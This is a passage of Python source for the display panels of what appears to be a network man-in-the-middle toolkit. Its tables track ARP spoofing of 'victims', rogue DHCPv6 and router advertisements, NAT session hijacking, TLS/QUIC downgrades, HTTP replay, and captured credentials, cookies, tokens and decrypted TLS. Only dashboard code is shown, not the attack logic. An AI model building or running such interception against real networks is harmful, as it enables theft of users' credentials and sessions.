    t.add_column("Time", width=8); t.add_column("Key", ratio=3)
    t.add_column("Op", width=6); t.add_column("Len", width=6)
    with STATE.lock: ev = list(STATE.ws_ctrl)[-50:]
    for ts, key, op, ln in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(key)[:60], op, str(ln))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no ctrl frames[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold]WS CONTROL INSPECTOR[/]",
                 border_style="cyan")

def panel_ech_downgrade():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Src", ratio=2)
    t.add_column("Dst", ratio=2); t.add_column("SNI", ratio=3)
    with STATE.lock: ev = list(STATE.ech_ops)[-50:]
    for ts, src, dst, sni in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  _tagged_ip(src, True), _tagged_ip(dst, True),
                  sni or "(encrypted)")
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no ECH[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]ECH DOWNGRADE[/]", border_style="cyan")

def panel_ech_outer():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Src", ratio=2)
    t.add_column("Dst", ratio=2); t.add_column("Provider", ratio=3)
    t.add_column("ALPN", width=10)
    with STATE.lock: ev = list(STATE.ech_outer)[-50:]
    for ts, src, dst, prov, alpn in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  src, dst, str(prov)[:60], str(alpn)[:10])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no ECH outer[/]", "[dim]—[/]",
                  "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]ECH OUTER-SNI MAP[/]", border_style="cyan")

def panel_quic_downgrade():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("MAC", ratio=3)
    t.add_column("Action", width=12)
    with STATE.lock: ev = list(STATE.quic_ops)[-50:]
    for ts, mac, action in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(mac), action)
    if QUIC_DOWNGRADE and QUIC_DOWNGRADE.targets:
        for mac in QUIC_DOWNGRADE.targets:
            t.add_row("[dim]active[/]", mac, "enforced")
    if not ev and not (QUIC_DOWNGRADE and QUIC_DOWNGRADE.targets):
        t.add_row("[dim]—[/]", "[dim]no downgrades[/]", "[dim]—[/]")
    return Panel(t, title="[bold]QUIC DOWNGRADE[/]", border_style="cyan")

def panel_quic_connid():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("ConnID", ratio=3)
    t.add_column("Sources", ratio=3)
    with STATE.lock: ev = list(STATE.quic_connid)[-50:]
    for ts, cid, srcs in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(cid)[:60], ",".join(str(x) for x in srcs)[:120])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no migration[/]", "[dim]—[/]")
    return Panel(t, title="[bold]QUIC CONN-ID TRACKER[/]", border_style="cyan")

def panel_quic_initials():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Src", ratio=2)
    t.add_column("Dst", ratio=2); t.add_column("DCID", ratio=2)
    t.add_column("SCID", ratio=2)
    with STATE.lock: ev = list(STATE.quic_initials)[-50:]
    for ts, src, dst, dcid, scid in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  src, dst, str(dcid)[:24], str(scid)[:24])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no QUIC initials[/]", "[dim]—[/]",
                  "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]QUIC INITIALS[/]", border_style="cyan")

def panel_quic_retry():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("TokenHash", ratio=3)
    t.add_column("Sources", ratio=3)
    with STATE.lock: ev = list(STATE.quic_retry)[-50:]
    for ts, th, srcs in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(th)[:60], ",".join(str(x) for x in srcs)[:120])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no retries[/]", "[dim]—[/]")
    return Panel(t, title="[bold]QUIC RETRY CORRELATOR[/]",
                 border_style="cyan")

def panel_ct_ranker():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("SNI", ratio=3)
    t.add_column("Score", width=8)
    with STATE.lock: ev = list(STATE.ct_ops)[-50:]
    for ts, sni, score in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(sni)[:80], str(score))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no CT gaps[/]", "[dim]—[/]")
    return Panel(t, title="[bold]CT GAP RANKER[/]", border_style="cyan")

def panel_ct_queries():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("SNI", ratio=3)
    t.add_column("Certs", width=8)
    with STATE.lock: ev = list(STATE.ct_queries)[-50:]
    for ts, sni, count in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(sni)[:80], str(count))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no CT log queries[/]", "[dim]—[/]")
    return Panel(t, title="[bold]CT LOG LOOKUPS[/]", border_style="cyan")

def panel_baseline():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Event", ratio=5)
    with STATE.lock: ev = list(STATE.baseline_ops)[-50:]
    for ts, msg in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(msg)[:140])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no anomalies[/]")
    return Panel(t, title="[bold]BEHAVIORAL BASELINE[/]", border_style="cyan")

def panel_correlation():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Kind", width=6)
    t.add_column("Hash", ratio=3); t.add_column("Devices", ratio=3)
    with STATE.lock: ev = list(STATE.correlations)[-50:]
    for ts, kind, h, macs in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  kind, str(h)[:60], ",".join(str(x) for x in macs)[:120])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no correlations[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold]CROSS-DEVICE CORRELATION[/]",
                 border_style="cyan")

def panel_cross_app():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Kind", width=6)
    t.add_column("Key", ratio=3); t.add_column("Devices", ratio=3)
    with STATE.lock: ev = list(STATE.cross_app)[-50:]
    for ts, kind, key, ips in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  kind, str(key)[:60], ",".join(str(x) for x in ips)[:120])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no cross-app[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold]CROSS-APP CORRELATOR[/]", border_style="cyan")

def panel_behavior_timing():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("Avg", width=8); t.add_column("Jitter", width=8)
    t.add_column("N", width=4)
    with STATE.lock: ev = list(STATE.behavior_apps)[-50:]
    for ts, ip, fp in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  ip, str(fp.get("avg")), str(fp.get("jitter")),
                  str(fp.get("n")))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no fingerprints[/]", "[dim]—[/]",
                  "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]BEHAVIORAL TIMING[/]", border_style="cyan")

def panel_refresh_tokens():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Host", ratio=2)
    t.add_column("Action", width=8); t.add_column("Hash", ratio=3)
    with STATE.lock: ev = list(STATE.refresh_chain)[-50:]
    for ts, host, action, h in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(host)[:40], action, h)
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no refresh tokens[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold]REFRESH TOKEN WATCHER[/]",
                 border_style="magenta")

def panel_psk_binder():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("SNI", ratio=3); t.add_column("Seen", width=6)
    with STATE.lock: ev = list(STATE.psk_binders)[-50:]
    for ts, ip, sni, n in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  ip, str(sni)[:60], str(n))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no binders[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]PSK BINDER INSPECTOR[/]", border_style="cyan")

def panel_tls_drift():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Device", ratio=2)
    t.add_column("Added", ratio=3); t.add_column("Removed", ratio=3)
    with STATE.lock: ev = list(STATE.tls_drift)[-50:]
    for ts, ip, added, removed in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  ip, added[:80], removed[:80])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no drift[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]TLS EXTENSION DRIFT[/]", border_style="cyan")

def panel_h2_push():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Stream", ratio=3)
    t.add_column("Pushes", width=8)
    with STATE.lock: ev = list(STATE.h2_push)[-50:]
    for ts, key, n in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(key)[:60], str(n))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no push abuse[/]", "[dim]—[/]")
    return Panel(t, title="[bold]H2 PUSH ABUSE[/]", border_style="cyan")

def panel_modules():
    t = _base_table()
    t.add_column("Module", ratio=2); t.add_column("Status", ratio=2)
    with STATE.lock: mods = list(STATE.modules_loaded)
    for m in mods[-20:]:
        t.add_row(m, "loaded")
    if not mods:
        t.add_row("[dim](none)[/]", "[dim]no modules loaded[/]")
    return Panel(t, title="[bold]LOADED MODULES[/]", border_style="cyan")

def panel_control_sock():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Command", ratio=4)
    with STATE.lock: ev = list(STATE.control_ops)[-20:]
    for ts, cmd in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"), cmd)
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no control ops[/]")
    return Panel(t, title="[bold]CONTROL SOCKET[/]", border_style="cyan")

def panel_nud_pin():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Target", ratio=3)
    with STATE.lock: ev = list(STATE.nud_ops)[-20:]
    for ts, ip in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"), ip)
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no NUD pins[/]")
    return Panel(t, title="[bold]NUD PIN ENGINE[/]", border_style="yellow")

def panel_sni_defrag():
    t = _base_table()
    t.add_column("Flow", ratio=4); t.add_column("Buffer", width=10)
    if SNI_DEFRAG:
        with SNI_DEFRAG._lock:
            for k, buf in list(SNI_DEFRAG.buffers.items())[:15]:
                t.add_row(f"{k[0]}:{k[1]}->{k[2]}:{k[3]}", str(len(buf)))
    if not (SNI_DEFRAG and SNI_DEFRAG.buffers):
        t.add_row("[dim]—[/]", "[dim]no fragmented flows[/]")
    return Panel(t, title="[bold]SNI DEFRAG[/]", border_style="cyan")

def panel_record_align():
    t = _base_table()
    t.add_column("Stream", ratio=2); t.add_column("Dir", width=6)
    t.add_column("Records", ratio=4)
    if RECORD_ALIGN:
        with RECORD_ALIGN._lock:
            for (stream, direction), recs in \
                    list(RECORD_ALIGN.records.items())[:15]:
                t.add_row(str(stream), direction, str(recs[-6:]))
    if not (RECORD_ALIGN and RECORD_ALIGN.records):
        t.add_row("[dim]—[/]", "[dim]no records[/]", "[dim]—[/]")
    return Panel(t, title="[bold]TLS RECORD ALIGN[/]", border_style="cyan")

def panel_isn_preserve():
    t = _base_table()
    t.add_column("Flow", ratio=4); t.add_column("LastSeq", width=12)
    if ISN_PRESERVE:
        with ISN_PRESERVE._lock:
            for k, seq in list(ISN_PRESERVE.state.items())[:15]:
                t.add_row(f"{k[0]}:{k[1]}->{k[2]}:{k[3]}", str(seq))
    if not (ISN_PRESERVE and ISN_PRESERVE.state):
        t.add_row("[dim]—[/]", "[dim]no flows tracked[/]")
    return Panel(t, title="[bold]ISN PRESERVE[/]", border_style="cyan")

def panel_ttl_mirror():
    t = _base_table()
    t.add_column("Dst", ratio=2); t.add_column("TTL", width=6)
    t.add_column("Window", width=12)
    if TTL_MIRROR:
        with TTL_MIRROR._lock:
            for ip, ttl in list(TTL_MIRROR.ttl_map.items())[:15]:
                t.add_row(ip, str(ttl),
                          str(TTL_MIRROR.window_map.get(ip, "?")))
    if not (TTL_MIRROR and TTL_MIRROR.ttl_map):
        t.add_row("[dim]—[/]", "[dim]no TTL learn[/]", "[dim]—[/]")
    return Panel(t, title="[bold]TTL / WINDOW MIRROR[/]", border_style="cyan")

def panel_window_mirror(): return panel_ttl_mirror()

def panel_forwarder():
    t = _base_table()
    t.add_column("Setting", ratio=2); t.add_column("Value", ratio=3)
    t.add_row("userspace forwarder",
              "on" if FORWARDER and FORWARDER.running else "off")
    t.add_row("kernel ip_forward",
              sh("cat /proc/sys/net/ipv4/ip_forward 2>/dev/null") or "?")
    t.add_row("kernel ipv6_forwarding",
              sh("cat /proc/sys/net/ipv6/conf/all/forwarding 2>/dev/null")
              or "?")
    with STATE.lock:
        fs = dict(STATE.forward_stats)
    t.add_row("queued out", str(fs.get("out", 0)))
    t.add_row("dropped", str(fs.get("dropped", 0)))
    t.add_row("shaped", str(fs.get("shaped", 0)))
    if FORWARDER:
        t.add_row("queue depth", str(FORWARDER.queue.qsize()))
    return Panel(t, title="[bold]USERSPACE FORWARDER[/]", border_style="cyan")

def panel_flow_shape():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Flow", ratio=3)
    t.add_column("Size", width=8); t.add_column("Action", width=8)
    with STATE.lock: ev = list(STATE.flow_shape)[-50:]
    for ts, key, size, action in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(key)[:60], str(size), action)
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no shaping[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]FLOW SHAPER[/]", border_style="yellow")

def panel_kalman_arp():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Victim", ratio=2)
    t.add_column("Interval", width=10)
    with STATE.lock: ev = list(STATE.kalman_ops)[-50:]
    for ts, ip, val in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  ip, str(val))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no Kalman updates[/]", "[dim]—[/]")
    return Panel(t, title="[bold]KALMAN ARP SCHEDULER[/]", border_style="yellow")

def panel_ttl_manip():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("MAC", ratio=2)
    t.add_column("TTL", width=6)
    with STATE.lock: ev = list(STATE.ttl_manip_ops)[-50:]
    for ts, mac, ttl in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  mac, str(ttl))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no TTL writes[/]", "[dim]—[/]")
    return Panel(t, title="[bold]TTL MANIPULATION[/]", border_style="yellow")

def panel_nat_hijack():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Src", ratio=2)
    t.add_column("Dst", ratio=2); t.add_column("Port", width=6)
    with STATE.lock: ev = list(STATE.nat_hijacks)[-50:]
    for ts, src, dst, dp, proto in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  src, dst, str(dp))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no NAT hijacks[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold]NAT SESSION HIJACK[/]",
                 border_style="magenta")

def panel_dhcp4():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Client", ratio=2)
    t.add_column("Offer", width=16); t.add_column("Type", width=8)
    with STATE.lock: ev = list(STATE.dhcp_leases)[-50:]
    for ts, mac, offer, kind in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  mac, offer, kind)
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no leases[/]", "[dim]—[/]", "[dim]—[/]")
    return Panel(t, title="[bold]DHCP LEASES (v4+v6)[/]",
                 border_style="magenta")

def panel_dhcp6():
    t = _base_table()
    t.add_column("Setting", ratio=2); t.add_column("Value", ratio=3)
    t.add_row("DHCPv6 server",
              "on" if DHCP6_SERVER and DHCP6_SERVER.running else "off")
    return Panel(t, title="[bold]DHCPv6 ROGUE[/]", border_style="magenta")

def panel_ra():
    t = _base_table()
    t.add_column("Metric", ratio=2); t.add_column("Value", ratio=3)
    t.add_row("RA server",
              "on" if RA_SERVER and RA_SERVER.running else "off")
    with STATE.lock: t.add_row("sent", str(STATE.ra_sent))
    return Panel(t, title="[bold]RA SERVER (RDNSS+PREF64)[/]",
                 border_style="magenta")

def panel_ndp():
    t = _base_table()
    t.add_column("Metric", ratio=2); t.add_column("Value", ratio=3)
    t.add_row("NDP server",
              "on" if NDP_SERVER and NDP_SERVER.running else "off")
    with STATE.lock: t.add_row("sent", str(STATE.ndp_sent))
    return Panel(t, title="[bold]NDP SERVER[/]", border_style="magenta")

def panel_smb_msg():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Target", ratio=3)
    t.add_column("Text", ratio=4)
    with STATE.lock: ev = list(STATE.smb_msgs)[-50:]
    for ts, target, text in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(target), str(text)[:120])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no SMB msgs[/]", "[dim]—[/]")
    return Panel(t, title="[bold]SMB MESSAGE[/]", border_style="cyan")

def panel_mdns_rename():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Host", ratio=3)
    t.add_column("New name", ratio=3)
    with STATE.lock: ev = list(STATE.mdns_renames)[-50:]
    for ts, hostname, name in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(hostname), str(name))
    if not ev:
        t.add_row("[dim]—[/]", "[dim]no renames[/]", "[dim]—[/]")
    return Panel(t, title="[bold]mDNS RENAME[/]", border_style="cyan")

def panel_replay():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Idx", width=6)
    t.add_column("Target", ratio=2); t.add_column("Resp", width=8)
    with STATE.lock: ev = list(STATE.replay_ops)[-50:]
    for ts, idx, target, ln in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(idx), str(target), str(ln))
    if REPLAY_ENGINE and REPLAY_ENGINE.store:
        t.add_row("[dim]stored[/]", str(len(REPLAY_ENGINE.store)),
                  "[dim]requests[/]", "")
    if not ev and not (REPLAY_ENGINE and REPLAY_ENGINE.store):
        t.add_row("[dim]—[/]", "[dim]no replays[/]", "[dim]—[/]",
                  "[dim]—[/]")
    return Panel(t, title="[bold]HTTP REPLAY[/]", border_style="red")

def panel_events():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Kind", width=14)
    t.add_column("Src", width=10); t.add_column("Detail", ratio=5)
    with STATE.lock: ev = list(STATE.events)[-50:]
    for ts, kind, src, text in reversed(ev):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  kind, src, str(text)[:140])
    if not ev:
        t.add_row("[dim]—[/]", "[dim]—[/]", "[dim]—[/]", "[dim]waiting…[/]")
    return Panel(t, title="[bold]EVENT STREAM[/]", border_style="cyan")

def panel_alerts():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Alert", ratio=5)
    with STATE.lock: al = list(STATE.alerts)[-30:]
    for ts, msg in reversed(al):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(msg)[:160])
    if not al: t.add_row("[dim]—[/]", "[dim]no alerts[/]")
    return Panel(t, title="[bold red]ANOMALY ALERTS[/]", border_style="red")

def panel_capture():
    t = _base_table()
    t.add_column("Metric", ratio=2); t.add_column("Value", ratio=3)
    if CAPTURE:
        t.add_row("iface", str(CAPTURE.iface))
        t.add_row("frames", str(CAPTURE.frames_seen))
        t.add_row("ring", str(len(CAPTURE.ring)))
        t.add_row("dropped", str(CAPTURE.dropped))
        t.add_row("pcap rotation", "on" if PCAP_ROTATE else "off")
        with STATE.lock:
            t.add_row("tx injections", str(len(STATE.tx_injections)))
    else: t.add_row("—", "—")
    return Panel(t, title="[bold]CAPTURE BUFFER[/]", border_style="cyan")

def panel_control():
    t = _base_table()
    t.add_column("Key", ratio=2); t.add_column("Value", ratio=3)
    t.add_row("exit", "q / Ctrl+X")
    t.add_row("scroll", "↑/↓ j/k · J/K PgUp/PgDn · g/G top/bot")
    t.add_row("output dir", OUTPUT_DIR)
    t.add_row("db", CONFIG["db_file"])
    t.add_row("control sock", CONFIG["control_socket"])
    t.add_row("mirror sock", CONFIG["mirror_socket"])
    t.add_row("signed log", CONFIG["signed_log"])
    if MITM_PROXY and MITM_PROXY._ca_cert:
        t.add_row("MITM CA cert", str(MITM_PROXY._ca_cert))
    return Panel(t, title="[bold]CONTROL[/]", border_style="cyan")

def panel_report():
    t = _base_table()
    t.add_column("Item", ratio=2); t.add_column("Value", ratio=3)
    with STATE.lock:
        t.add_row("devices", str(len(STATE.devices)))
        t.add_row("dns events", str(len(STATE.dns_events)))
        t.add_row("ja4 events", str(len(STATE.ja4_events)))
        t.add_row("ja3 events", str(len(STATE.ja3_events)))
        t.add_row("flows", str(len(STATE.flows)))
        t.add_row("tokens", str(len(STATE.tokens)))
        t.add_row("credentials", str(len(STATE.credentials)))
        t.add_row("cookies", str(len(STATE.cookies)))
        t.add_row("jwts", str(len(STATE.jwts)))
        t.add_row("oauth", str(len(STATE.oauth_flows)))
        t.add_row("http requests", str(len(STATE.http_requests)))
        t.add_row("http responses", str(len(STATE.http_responses)))
        t.add_row("tls decrypted", str(len(STATE.tls_decrypted)))
        t.add_row("dhcp leases", str(len(STATE.dhcp_leases)))
        t.add_row("rule hits", str(len(STATE.rule_hits)))
        t.add_row("tx injections", str(len(STATE.tx_injections)))
        t.add_row("dnsbl hits", str(len(STATE.dnsbl_hits)))
        t.add_row("dnsbl devices", str(len(STATE.dnsbl_devices)))
        t.add_row("dnsbl domains", str(len(STATE.dnsbl_domains)))
        t.add_row("dnsbl whitelist size", str(len(_DNSBL)))
        t.add_row("mitm flows", str(len(STATE.mitm_flows)))
        t.add_row("mitm pins", str(len(STATE.mitm_pins)))
        t.add_row("mitm errors", str(len(STATE.mitm_errors)))
        t.add_row("OUI vendors loaded", str(len(_OUI_VENDORS)))
        t.add_row("JA3 labels loaded", str(len(_JA3_DB)))
        t.add_row("UA profiles loaded", str(len(_UA_DB["browsers"])))
        t.add_row("DHCP fp entries", str(len(_DHCP_FP)))
    t.add_row("output dir", OUTPUT_DIR)
    return Panel(t, title="[bold]SESSION REPORT[/]", border_style="cyan")

def panel_arp_table():
    t = _base_table()
    t.add_column("IP", ratio=2); t.add_column("MAC", ratio=2)
    t.add_column("Device", ratio=2)
    try:
        out = sh("ip -4 neigh show 2>/dev/null")
        for line in out.splitlines()[:30]:
            parts = line.split()
            if len(parts) >= 5 and parts[2] == "lladdr":
                ip = parts[0]; mac = parts[4]
                with STATE.lock: d = STATE.devices.get(ip)
                dev = (d.hostname or d.vendor) if d else "?"
                t.add_row(ip, mac, str(dev)[:30])
    except Exception: pass
    return Panel(t, title="[bold]ARP TABLE[/]", border_style="cyan")

def panel_testharness():
    t = _base_table()
    t.add_column("Time", width=8); t.add_column("Fixture", ratio=3)
    t.add_column("Status", width=8)
    with STATE.lock: res = list(STATE.test_results)[-50:]
    for ts, fn, ok in reversed(res):
        t.add_row(datetime.fromtimestamp(ts).strftime("%H:%M:%S"),
                  str(fn), "[green]PASS[/]" if ok else "[red]FAIL[/]")
    if not res:
        t.add_row("[dim]—[/]", "[dim]no tests run[/]", "[dim]—[/]")
    return Panel(t, title="[bold]TEST HARNESS[/]", border_style="cyan")

PANEL_FUNCS = {
    "STATUS": panel_status,
    "DEVICES": panel_devices,
    "SESSIONS": panel_sessions,
    "FLOWS": panel_flows,
    "DNS": panel_dns,
    "DNSBL": panel_dnsbl,
    "DNSBL_DEVICES": panel_dnsbl_devices,
    "DNSBL_DOMAINS": panel_dnsbl_domains,
    "DNSBL_WHITELIST": panel_dnsbl_whitelist,
    "MITM_PROXY": panel_mitm_proxy,
    "MITM_FLOWS": panel_mitm_flows,
    "MITM_PINS": panel_mitm_pins,
    "MITM_ERRORS": panel_mitm_errors,
    "PROXY_FLOWS": panel_proxy_flows,
    "DOH_BLOCKS": panel_doh_blocks,
    "IPV6_MITM": panel_ipv6_mitm,
    "STACK": panel_software_stack,
    "JA3": panel_ja3, "JA3S": panel_ja3s,
    "JA4": panel_ja4, "JA4S": panel_ja4s,
    "JA4H": panel_ja4h, "JA4X": panel_ja4x, "JA4SSH": panel_ja4ssh,
    "JA4_KNOWN": panel_ja4_known,
    "JA4_FINGERPRINTS": panel_ja4_fingerprints,
    "OUI": panel_oui, "UA": panel_ua, "DHCP_FP": panel_dhcp_fp,
    "IDENTITY": panel_identity, "INTENT": panel_intent,
    "TOKENS": panel_tokens,
    "CREDENTIALS": panel_credentials,
    "PROTO_CREDS": panel_proto_creds,
    "COOKIES": panel_cookies, "COOKIE_JAR": panel_cookie_jar,
    "COOKIE_GRAPH": panel_cookie_graph,
    "JWTS": panel_jwts, "OAUTH": panel_oauth,
    "CSRF": panel_csrf, "FORMS": panel_forms,
    "BODIES": panel_bodies,
    "HTTP_REQUESTS": panel_http_requests,
    "HTTP_RESPONSES": panel_http_responses,
    "TLS_DECRYPTED": panel_tls_decrypted,
    "DNS_POLICY": panel_dns_policy,
    "SEARCH_HIJACK": panel_search_hijack,
    "CAPTIVE_HIJACK": panel_captive_hijack,
    "NOTIFY": panel_notify, "PORTAL": panel_portal,
    "TLS_HIJACK": panel_tls_hijack,
    "TCP_FORK": panel_tcp_fork,
    "H2_HPACK": panel_h2_hpack, "H2_FRAMES": panel_h2_frames,
    "WS_SPLICE": panel_ws_splice, "WS_CTRL": panel_ws_ctrl,
    "ECH_DOWNGRADE": panel_ech_downgrade, "ECH_OUTER": panel_ech_outer,
    "QUIC_DOWNGRADE": panel_quic_downgrade,
    "QUIC_CONNID": panel_quic_connid,
    "QUIC_INITIALS": panel_quic_initials,
    "QUIC_RETRY": panel_quic_retry,
    "CT_RANKER": panel_ct_ranker, "CT_QUERIES": panel_ct_queries,
    "BASELINE": panel_baseline,
    "CORRELATION": panel_correlation,
    "CROSS_APP": panel_cross_app,
    "BEHAVIOR_TIMING": panel_behavior_timing,
    "REFRESH_TOKENS": panel_refresh_tokens,
    "PSK_BINDER": panel_psk_binder,
    "TLS_DRIFT": panel_tls_drift, "H2_PUSH": panel_h2_push,
    "MODULES": panel_modules,
    "CONTROL_SOCK": panel_control_sock,
    "NUD_PIN": panel_nud_pin, "SNI_DEFRAG": panel_sni_defrag,
    "RECORD_ALIGN": panel_record_align,
    "ISN_PRESERVE": panel_isn_preserve,
    "TTL_MIRROR": panel_ttl_mirror,
    "WINDOW_MIRROR": panel_window_mirror,
    "FORWARDER": panel_forwarder,
    "FLOW_SHAPE": panel_flow_shape,
    "KALMAN_ARP": panel_kalman_arp,
    "TTL_MANIP": panel_ttl_manip,
    "NAT_HIJACK": panel_nat_hijack,
    "DHCP4": panel_dhcp4, "DHCP6": panel_dhcp6,
    "RA": panel_ra, "NDP": panel_ndp,
    "SMB_MSG": panel_smb_msg,
    "MDNS_RENAME": panel_mdns_rename,
    "REPLAY": panel_replay,
    "EVENTS": panel_events, "ALERTS": panel_alerts,
    "CAPTURE": panel_capture,
    "CONTROL": panel_control, "REPORT": panel_report,
    "ARP_TABLE": panel_arp_table,
    "TESTHARNESS": panel_testharness,
}

ROWS_ORDER = [
    "STATUS",
    "DEVICES", "SESSIONS", "FLOWS",
    "DNS", "DNSBL", "DNSBL_DEVICES", "DNSBL_DOMAINS", "DNSBL_WHITELIST",
    "MITM_PROXY", "MITM_FLOWS", "MITM_PINS", "MITM_ERRORS",
    "PROXY_FLOWS", "DOH_BLOCKS", "IPV6_MITM",
    "STACK",
    "JA3", "JA3S", "JA4", "JA4S", "JA4H", "JA4X", "JA4SSH",
    "JA4_KNOWN", "JA4_FINGERPRINTS",
    "OUI", "UA", "DHCP_FP",
    "IDENTITY", "INTENT",
    "TOKENS", "CREDENTIALS", "PROTO_CREDS",
    "COOKIES", "COOKIE_JAR", "COOKIE_GRAPH",
    "JWTS", "OAUTH", "CSRF", "FORMS", "BODIES",
    "HTTP_REQUESTS", "HTTP_RESPONSES", "TLS_DECRYPTED",
    "DNS_POLICY", "SEARCH_HIJACK", "CAPTIVE_HIJACK",
    "NOTIFY", "PORTAL",
    "TLS_HIJACK", "TCP_FORK",
    "H2_HPACK", "H2_FRAMES", "WS_SPLICE", "WS_CTRL",
    "ECH_DOWNGRADE", "ECH_OUTER",
    "QUIC_DOWNGRADE", "QUIC_CONNID", "QUIC_INITIALS", "QUIC_RETRY",
    "CT_RANKER", "CT_QUERIES", "BASELINE",
    "CORRELATION", "CROSS_APP",
    "BEHAVIOR_TIMING", "REFRESH_TOKENS", "PSK_BINDER",
    "TLS_DRIFT", "H2_PUSH",
